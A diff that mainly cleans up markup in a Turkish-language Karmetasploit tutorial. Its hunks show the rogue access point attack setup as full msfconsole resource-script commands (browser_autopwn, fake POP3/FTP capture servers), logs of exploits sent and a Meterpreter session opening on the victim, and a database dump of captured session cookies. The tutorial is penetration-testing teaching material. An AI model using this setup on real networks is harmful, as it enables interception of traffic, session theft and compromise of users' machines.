@@ -40,10 +40,10 @@ Karmetasploit, access point noktaları oluşturma, parola yakalama, bilgi toplam
 ```bash
 root@kali:~# wget <a href="https://www.offensive-security.com/wp-content/uploads/2015/04/karma.rc_.txt">https://www.offensive-security.com/wp-content/uploads/2015/04/karma.rc_.txt</a>
 --2015-04-03 16:17:27-- <a href="https://www.offensive-security.com/downloads/karma.rc">https://www.offensive-security.com/downloads/karma.rc</a>
-Resolving <a href="http://www.offensive-security.com/">www.offensive-security.com</a> **(**<a href="http://www.offensive-security.com/">www.offensive-security.com</a>**)**... 198.50.176.211
-Connecting to <a href="http://www.offensive-security.com/">www.offensive-security.com</a> **(**<a href="http://www.offensive-security.com/">www.offensive-security.com</a>**)**|198.50.176.211|:443... connected.
+Resolving <a href="http://www.offensive-security.com/">www.offensive-security.com</a> (<a href="http://www.offensive-security.com/">www.offensive-security.com</a>)... 198.50.176.211
+Connecting to <a href="http://www.offensive-security.com/">www.offensive-security.com</a> (<a href="http://www.offensive-security.com/">www.offensive-security.com</a>)|198.50.176.211|:443... connected.
 HTTP request sent, awaiting response... 200 OK
-Length: 1089 **(**1.1K**)** **[**text/plain]
+Length: 1089 (1.1K) **[**text/plain]
 
 Saving to: `karma.rc' 100%[======================================>] 1,089 --.-K/s in 0s
 
@@ -121,17 +121,17 @@ Reading state information... Done
 
 ```bash
 root@kali:~# gem install activerecord sqlite3
-Fetching: activerecord-5.0.0.1.gem **(**100%**)**
+Fetching: activerecord-5.0.0.1.gem (100%)
 Successfully installed activerecord-5.0.0.1
-Parsing documentation **for **activerecord-5.0.0.1
-Installing ri documentation **for **activerecord-5.0.0.1
-Done installing documentation **for **activerecord after 7 seconds
-Fetching: sqlite3-1.3.12.gem **(**100%**)**
+Parsing documentation for **activerecord-5.0.0.1
+Installing ri documentation for **activerecord-5.0.0.1
+Done installing documentation for **activerecord after 7 seconds
+Fetching: sqlite3-1.3.12.gem (100%)
 Building native extensions.  This could take a **while**...
 Successfully installed sqlite3-1.3.12
-Parsing documentation **for **sqlite3-1.3.12
-Installing ri documentation **for **sqlite3-1.3.12
-Done installing documentation **for **sqlite3 after 0 seconds
+Parsing documentation for **sqlite3-1.3.12
+Installing ri documentation for **sqlite3-1.3.12
+Done installing documentation for **sqlite3 after 0 seconds
 2 gems installed
 root@kali:~#
 ```
@@ -174,12 +174,12 @@ PHY	Interface	Driver		Chipset
 
 phy0	wlan0		ath9k_htc	Atheros Communications, Inc. AR9271 802.11n
 
-		**(**mac80211 monitor mode vif enabled **for** **[**phy0]wlan0 on **[**phy0]wlan0mon**)**
-		**(**mac80211 station mode vif disabled **for** **[**phy0]wlan0**)**
+		(mac80211 monitor mode vif enabled for** **[**phy0]wlan0 on **[**phy0]wlan0mon)
+		(mac80211 station mode vif disabled for** **[**phy0]wlan0)
 
 Found 2 processes that could cause trouble.
 If airodump-ng, aireplay-ng or airtun-ng stops working after
-a short period of time, you may want to kill **(**some of**)** them!
+a short period of time, you may want to kill (some of) them!
 
 PID     Name
 693     dhclient
@@ -243,48 +243,48 @@ root@kali:~#
 ```bash
 root@kali:~# msfconsole -q -r karma.rc_.txt
 
-> Processing karma.rc_.txt **for **ERB directives.
-resource **(**karma.rc_.txt**)>** db_connect postgres:toor@127.0.0.1/msfbook
-resource **(**karma.rc_.txt**)>** use auxiliary/server/browser_autopwn
-resource **(**karma.rc_.txt**)>** setg AUTOPWN_HOST 10.0.0.1
-AUTOPWN_HOST **=>** 10.0.0.1
-resource **(**karma.rc_.txt**)>** setg AUTOPWN_PORT 55550
-AUTOPWN_PORT **=>** 55550
-resource **(**karma.rc_.txt**)>** setg AUTOPWN_URI /ads
-AUTOPWN_URI **=>** /ads
-resource **(**karma.rc_.txt**)>** set LHOST 10.0.0.1
-LHOST **=>** 10.0.0.1
-resource **(**karma.rc_.txt**)>** set LPORT 45000
-LPORT **=>** 45000
-resource **(**karma.rc_.txt**)>** set SRVPORT 55550
-SRVPORT **=>** 55550
-resource **(**karma.rc_.txt**)>** set URIPATH /ads
-URIPATH **=>** /ads
-resource **(**karma.rc_.txt**)>** run
+> Processing karma.rc_.txt for **ERB directives.
+resource (karma.rc_.txt**)>** db_connect postgres:toor@127.0.0.1/msfbook
+resource (karma.rc_.txt**)>** use auxiliary/server/browser_autopwn
+resource (karma.rc_.txt**)>** setg AUTOPWN_HOST 10.0.0.1
+AUTOPWN_HOST => 10.0.0.1
+resource (karma.rc_.txt**)>** setg AUTOPWN_PORT 55550
+AUTOPWN_PORT => 55550
+resource (karma.rc_.txt**)>** setg AUTOPWN_URI /ads
+AUTOPWN_URI => /ads
+resource (karma.rc_.txt**)>** set LHOST 10.0.0.1
+LHOST => 10.0.0.1
+resource (karma.rc_.txt**)>** set LPORT 45000
+LPORT => 45000
+resource (karma.rc_.txt**)>** set SRVPORT 55550
+SRVPORT => 55550
+resource (karma.rc_.txt**)>** set URIPATH /ads
+URIPATH => /ads
+resource (karma.rc_.txt**)>** run
 > Auxiliary module execution completed
-resource **(**karma.rc_.txt**)>** use auxiliary/server/capture/pop3
-resource **(**karma.rc_.txt**)>** set SRVPORT 110
-SRVPORT **=>** 110
-resource **(**karma.rc_.txt**)>** set SSL false
-SSL **=>** false
-resource **(**karma.rc_.txt**)>** run
+resource (karma.rc_.txt**)>** use auxiliary/server/capture/pop3
+resource (karma.rc_.txt**)>** set SRVPORT 110
+SRVPORT => 110
+resource (karma.rc_.txt**)>** set SSL false
+SSL => false
+resource (karma.rc_.txt**)>** run
 > Auxiliary module execution completed
-resource **(**karma.rc_.txt**)>** use auxiliary/server/capture/pop3
-resource **(**karma.rc_.txt**)>** set SRVPORT 995
-SRVPORT **=>** 995
-resource **(**karma.rc_.txt**)>** set SSL true
-SSL **=>** true
-resource **(**karma.rc_.txt**)>** run
+resource (karma.rc_.txt**)>** use auxiliary/server/capture/pop3
+resource (karma.rc_.txt**)>** set SRVPORT 995
+SRVPORT => 995
+resource (karma.rc_.txt**)>** set SSL true
+SSL => true
+resource (karma.rc_.txt**)>** run
 > Auxiliary module execution completed
-resource **(**karma.rc_.txt**)>** use auxiliary/server/capture/ftp
+resource (karma.rc_.txt**)>** use auxiliary/server/capture/ftp
 > Setup
-resource **(**karma.rc_.txt**)>** run
+resource (karma.rc_.txt**)>** run
 > Listening on 0.0.0.0:110...
 > Auxiliary module execution completed
 > Server started.
 
 
-msf auxiliary**(**http**)** >
+msf auxiliary(http) >
 ```
 
 
@@ -297,28 +297,28 @@ Kayıt edilen paketlere bakalım.
 
 
 ```bash
-msf auxiliary**(**http**)** >
-> DNS 10.0.0.100:1276 XID 87 **(**IN::A <a href="http://www.msn.com/">www.msn.com</a>**)**
-> DNS 10.0.0.100:1276 XID 87 **(**IN::A <a href="http://www.msn.com/">www.msn.com</a>**)**
+msf auxiliary(http) >
+> DNS 10.0.0.100:1276 XID 87 (IN::A <a href="http://www.msn.com/">www.msn.com</a>)
+> DNS 10.0.0.100:1276 XID 87 (IN::A <a href="http://www.msn.com/">www.msn.com</a>)
 > HTTP REQUEST 10.0.0.100 > <a href="http://www.msn.com/">www.msn.com:80</a> GET / Windows IE 5.01 cookies**=**MC1**=**V**=**3&amp;GUID**=**e2eabc69be554e3587acce84901a53d3; MUID**=**E7E065776DBC40099851B16A38DB8275; mh**=**MSFT; CULTURE**=**EN-US; zip**=**z:68101|la:41.26|lo:-96.013|c:US|hr:1; FlightGroupId**=**14; FlightId**=**BasePage; hpsvr**=**M:5|F:5|T:5|E:5|D:blu|W:F; hpcli**=**W.H|L.|S.|R.|U.L|C.|H.; ushpwea**=**wc:USNE0363; wpv**=**2
-> DNS 10.0.0.100:1279 XID 88 **(**IN::A <a href="http://adwords.google.com/">adwords.google.com</a>**)**
-> DNS 10.0.0.100:1279 XID 88 **(**IN::A <a href="http://adwords.google.com/">adwords.google.com</a>**)**
-> DNS 10.0.0.100:1280 XID 89 **(**IN::A <a href="http://blogger.com/">blogger.com</a>**)**
-> DNS 10.0.0.100:1280 XID 89 **(**IN::A <a href="http://blogger.com/">blogger.com</a>**)**
+> DNS 10.0.0.100:1279 XID 88 (IN::A <a href="http://adwords.google.com/">adwords.google.com</a>)
+> DNS 10.0.0.100:1279 XID 88 (IN::A <a href="http://adwords.google.com/">adwords.google.com</a>)
+> DNS 10.0.0.100:1280 XID 89 (IN::A <a href="http://blogger.com/">blogger.com</a>)
+> DNS 10.0.0.100:1280 XID 89 (IN::A <a href="http://blogger.com/">blogger.com</a>)
 ...snip...
-> DNS 10.0.0.100:1289 XID 95 **(**IN::A <a href="http://gmail.com/">gmail.com</a>**)**
-> DNS 10.0.0.100:1289 XID 95 **(**IN::A <a href="http://gmail.com/">gmail.com</a>**)**
-> DNS 10.0.0.100:1289 XID 95 **(**IN::A <a href="http://gmail.com/">gmail.com</a>**)**
-> DNS 10.0.0.100:1292 XID 96 **(**IN::A <a href="http://gmail.google.com/">gmail.google.com</a>**)**
-> DNS 10.0.0.100:1292 XID 96 **(**IN::A <a href="http://gmail.google.com/">gmail.google.com</a>**)**
-> DNS 10.0.0.100:1292 XID 96 **(**IN::A <a href="http://gmail.google.com/">gmail.google.com</a>**)**
-> DNS 10.0.0.100:1292 XID 96 **(**IN::A <a href="http://gmail.google.com/">gmail.google.com</a>**)**
-> DNS 10.0.0.100:1292 XID 96 **(**IN::A <a href="http://gmail.google.com/">gmail.google.com</a>**)**
+> DNS 10.0.0.100:1289 XID 95 (IN::A <a href="http://gmail.com/">gmail.com</a>)
+> DNS 10.0.0.100:1289 XID 95 (IN::A <a href="http://gmail.com/">gmail.com</a>)
+> DNS 10.0.0.100:1289 XID 95 (IN::A <a href="http://gmail.com/">gmail.com</a>)
+> DNS 10.0.0.100:1292 XID 96 (IN::A <a href="http://gmail.google.com/">gmail.google.com</a>)
+> DNS 10.0.0.100:1292 XID 96 (IN::A <a href="http://gmail.google.com/">gmail.google.com</a>)
+> DNS 10.0.0.100:1292 XID 96 (IN::A <a href="http://gmail.google.com/">gmail.google.com</a>)
+> DNS 10.0.0.100:1292 XID 96 (IN::A <a href="http://gmail.google.com/">gmail.google.com</a>)
+> DNS 10.0.0.100:1292 XID 96 (IN::A <a href="http://gmail.google.com/">gmail.google.com</a>)
 > Request '/ads' from 10.0.0.100:1278
 > Recording detection from User-Agent
-> DNS 10.0.0.100:1292 XID 96 **(**IN::A <a href="http://gmail.google.com/">gmail.google.com</a>**)**
+> DNS 10.0.0.100:1292 XID 96 (IN::A <a href="http://gmail.google.com/">gmail.google.com</a>)
 > Browser claims to be MSIE 5.01, running on Windows 2000
-> DNS 10.0.0.100:1293 XID 97 **(**IN::A <a href="http://google.com/">google.com</a>**)**
+> DNS 10.0.0.100:1293 XID 97 (IN::A <a href="http://google.com/">google.com</a>)
 > Error: SQLite3::SQLException cannot start a transaction within a transaction /usr/lib/ruby/1.8/sqlite3/errors.rb:62:in `check'/usr/lib/ruby/1.8/sqlite3/resultset.rb:47:in `check'/usr/lib/ruby/1.8/sqlite3/resultset.rb:39:in `commence'/usr/lib/ruby/1.8/sqlite3
 ...snip...
 [*] HTTP REQUEST 10.0.0.100 > <a href="http://ecademy.com/">ecademy.com</a>:80 GET /forms.html Windows IE 5.01 cookies=
@@ -406,11 +406,11 @@ Yukarıdaki çıktılardan, kullanıcının bir çok adrese bağlandığını ve
 
 
 ```bash
-> DNS 10.0.0.100:1284 XID 92 **(**IN::A <a href="http://ecademy.com/">ecademy.com</a>**)**
-> DNS 10.0.0.100:1286 XID 93 **(**IN::A <a href="http://facebook.com/">facebook.com</a>**)**
-> DNS 10.0.0.100:1286 XID 93 **(**IN::A <a href="http://facebook.com/">facebook.com</a>**)**
-> DNS 10.0.0.100:1287 XID 94 **(**IN::A <a href="http://gather.com/">gather.com</a>**)**
-> DNS 10.0.0.100:1287 XID 94 **(**IN::A <a href="http://gather.com/">gather.com</a>**)**
+> DNS 10.0.0.100:1284 XID 92 (IN::A <a href="http://ecademy.com/">ecademy.com</a>)
+> DNS 10.0.0.100:1286 XID 93 (IN::A <a href="http://facebook.com/">facebook.com</a>)
+> DNS 10.0.0.100:1286 XID 93 (IN::A <a href="http://facebook.com/">facebook.com</a>)
+> DNS 10.0.0.100:1287 XID 94 (IN::A <a href="http://gather.com/">gather.com</a>)
+> DNS 10.0.0.100:1287 XID 94 (IN::A <a href="http://gather.com/">gather.com</a>)
 ```
 
 
@@ -436,7 +436,7 @@ Here we can see Karmetasploit collecting cookie information from the client. Thi
 > Closing service handle...
 > Opening service...
 > Starting the service...
-> Transmitting intermediate stager **for **over-sized stage...**(**191 bytes**)**
+> Transmitting intermediate stager for **over-sized stage...(191 bytes)
 > Removing the service...
 > Closing service handle...
 > Deleting UxsjordQ.exe...
@@ -449,18 +449,18 @@ Here we can see Karmetasploit collecting cookie information from the client. Thi
 > Ignoring request from 10.0.0.100, attack already **in **progress.
 > Sending Access Denied to 10.0.0.100:1365 TARGET\P0WN3D
 > Sending Apple QuickTime 7.1.3 RTSP URI Buffer Overflow to 10.0.0.100:1278...
-> Sending stage **(**2650 bytes**)**
+> Sending stage (2650 bytes)
 > Sending iPhone MobileSafari LibTIFF Buffer Overflow to 10.0.0.100:1367...
 > HTTP REQUEST 10.0.0.100 > <a href="http://www.care2.com/">www.care2.com:80</a> GET / Windows IE 5.01 cookies**=**
 > Sleeping before handling stage...
 > HTTP REQUEST 10.0.0.100 > <a href="http://www.yahoo.com/">www.yahoo.com:80</a> GET / Windows IE 5.01 cookies**=**
 > HTTP REQUEST 10.0.0.100 > <a href="http://yahoo.com/">yahoo.com</a>:80 GET / Windows IE 5.01 cookies**=**
-> Uploading DLL **(**75787 bytes**)**...
+> Uploading DLL (75787 bytes)...
 > Upload completed.
 > Migrating to lsass.exe...
-> Current server process: rundll32.exe **(**848**)**
-> New server process: lsass.exe **(**232**)**
-> Meterpreter session 1 opened **(**10.0.0.1:45017 -> 10.0.0.100:1364**)**
+> Current server process: rundll32.exe (848)
+> New server process: lsass.exe (232)
+> Meterpreter session 1 opened (10.0.0.1:45017 -> 10.0.0.100:1364)
 ```
 
 
@@ -473,7 +473,7 @@ Açılan Meterpreter oturumunda neler yapılabileceğine bakalım.
 
 
 ```bash
-msf auxiliary**(**http**)** > sessions -i 1
+msf auxiliary(http) > sessions -i 1
 > Starting interaction with 1...
 
 meterpreter > ps
@@ -547,88 +547,88 @@ Veri tabanı Ev klasöründe oluşturulmuştu. Aşağıdaki komut ile veri taban
 ```bash
 root@kali:~# sqlite3 karma.db
 SQLite version 3.5.9
-Enter ".help" **for **instructions
+Enter ".help" for **instructions
 sqlite> .schema
-CREATE TABLE hosts **(**
+CREATE TABLE hosts (
 'id' INTEGER PRIMARY KEY NOT NULL,
 'created' TIMESTAMP,
-'address' VARCHAR**(**16**)** UNIQUE,
-'comm' VARCHAR**(**255**)**,
-'name' VARCHAR**(**255**)**,
-'state' VARCHAR**(**255**)**,
-'desc' VARCHAR**(**1024**)**,
-'os_name' VARCHAR**(**255**)**,
-'os_flavor' VARCHAR**(**255**)**,
-'os_sp' VARCHAR**(**255**)**,
-'os_lang' VARCHAR**(**255**)**,
-'arch' VARCHAR**(**255**)**
-**)**;
-CREATE TABLE notes **(**
+'address' VARCHAR(16) UNIQUE,
+'comm' VARCHAR(255),
+'name' VARCHAR(255),
+'state' VARCHAR(255),
+'desc' VARCHAR(1024),
+'os_name' VARCHAR(255),
+'os_flavor' VARCHAR(255),
+'os_sp' VARCHAR(255),
+'os_lang' VARCHAR(255),
+'arch' VARCHAR(255)
+);
+CREATE TABLE notes (
 'id' INTEGER PRIMARY KEY NOT NULL,
 'created' TIMESTAMP,
 'host_id' INTEGER,
-'ntype' VARCHAR**(**512**)**,
+'ntype' VARCHAR(512),
 'data' TEXT
-**)**;
-CREATE TABLE refs **(**
+);
+CREATE TABLE refs (
 'id' INTEGER PRIMARY KEY NOT NULL,
 'ref_id' INTEGER,
 'created' TIMESTAMP,
-'name' VARCHAR**(**512**)**
-**)**;
-CREATE TABLE reports **(**
+'name' VARCHAR(512)
+);
+CREATE TABLE reports (
 'id' INTEGER PRIMARY KEY NOT NULL,
 'target_id' INTEGER,
 'parent_id' INTEGER,
-'entity' VARCHAR**(**50**)**,
-'etype' VARCHAR**(**50**)**,
+'entity' VARCHAR(50),
+'etype' VARCHAR(50),
 'value' BLOB,
 'notes' VARCHAR,
 'source' VARCHAR,
 'created' TIMESTAMP
-**)**;
-CREATE TABLE requests **(**
-'host' VARCHAR**(**20**)**,
+);
+CREATE TABLE requests (
+'host' VARCHAR(20),
 'port' INTEGER,
 'ssl' INTEGER,
-'meth' VARCHAR**(**20**)**,
+'meth' VARCHAR(20),
 'path' BLOB,
 'headers' BLOB,
 'query' BLOB,
 'body' BLOB,
-'respcode' VARCHAR**(**5**)**,
+'respcode' VARCHAR(5),
 'resphead' BLOB,
 'response' BLOB,
 'created' TIMESTAMP
-**)**;
-CREATE TABLE services **(**
+);
+CREATE TABLE services (
 'id' INTEGER PRIMARY KEY NOT NULL,
 'host_id' INTEGER,
 'created' TIMESTAMP,
 'port' INTEGER NOT NULL,
-'proto' VARCHAR**(**16**)** NOT NULL,
-'state' VARCHAR**(**255**)**,
-'name' VARCHAR**(**255**)**,
-'desc' VARCHAR**(**1024**)**
-**)**;
-CREATE TABLE targets **(**
+'proto' VARCHAR(16) NOT NULL,
+'state' VARCHAR(255),
+'name' VARCHAR(255),
+'desc' VARCHAR(1024)
+);
+CREATE TABLE targets (
 'id' INTEGER PRIMARY KEY NOT NULL,
-'host' VARCHAR**(**20**)**,
+'host' VARCHAR(20),
 'port' INTEGER,
 'ssl' INTEGER,
 'selected' INTEGER
-**)**;
-CREATE TABLE vulns **(**
+);
+CREATE TABLE vulns (
 'id' INTEGER PRIMARY KEY NOT NULL,
 'service_id' INTEGER,
 'created' TIMESTAMP,
-'name' VARCHAR**(**1024**)**,
+'name' VARCHAR(1024),
 'data' TEXT
-**)**;
-CREATE TABLE vulns_refs **(**
+);
+CREATE TABLE vulns_refs (
 'ref_id' INTEGER,
 'vuln_id' INTEGER
-**)**;
+);
 ```
 
 
@@ -640,7 +640,7 @@ Veri tabanı şemasından faydalanarak bilgileri kontrol edelim.
 sqlite> **select** ***** from hosts;
 1|2009-05-09 23:47:04|10.0.0.100|||alive||Windows|2000|||x86
 sqlite> **select** ***** from notes where host_id **=** 1;
-1|2009-05-09 23:47:04|1|http_cookies|en-us.start2.mozilla.com __utma**=**183859642.1221819733.1241334886.1241334886.1241334886.1; __utmz**=**183859642.1241334886.1.1.utmccn**=(**organic**)**|utmcsr**=**google|utmctr**=**firefox|utmcmd**=**organic
+1|2009-05-09 23:47:04|1|http_cookies|en-us.start2.mozilla.com __utma**=**183859642.1221819733.1241334886.1241334886.1241334886.1; __utmz**=**183859642.1241334886.1.1.utmccn**=(**organic)|utmcsr**=**google|utmctr**=**firefox|utmcmd**=**organic
 2|2009-05-09 23:47:04|1|http_request|en-us.start2.mozilla.com:80 GET /firefox Windows FF 1.9.0.10
 3|2009-05-09 23:47:05|1|http_cookies|adwords.google.com PREF**=**ID**=**ee60297d21c2a6e5:U**=**ecaec12d78faa1ba:TM**=**1241913986:LM**=**1241926890:GM**=**1:S**=**-p5nGxSz_oh1inss; NID**=**22**=**Yse3kJm0PoVwyYxj8GKC6LvlIqQMsruiPwQrcRRnLO_4Z0CzBRCIUucvroS_Rujrx6ov-tXzVKN2KJN4pEJdg25ViugPU0UZQhTuh80hNAPvvsq2_HARTNlG7dgUrBNq; SID**=**DQAAAHAAAADNMtnGqaWPkEBIxfsMQNzDt_f7KykHkPoYCRZn_Zen8zleeLyKr8XUmLvJVPZoxsdSBUd22TbQ3p1nc0TcoNHv7cEihkxtHl45zZraamzaji9qRC-XxU9po34obEBzGotphFHoAtLxgThdHQKWNQZq
 4|2009-05-09 23:47:05|1|http_request|adwords.google.com:80 GET /forms.html Windows FF 1.9.0.10
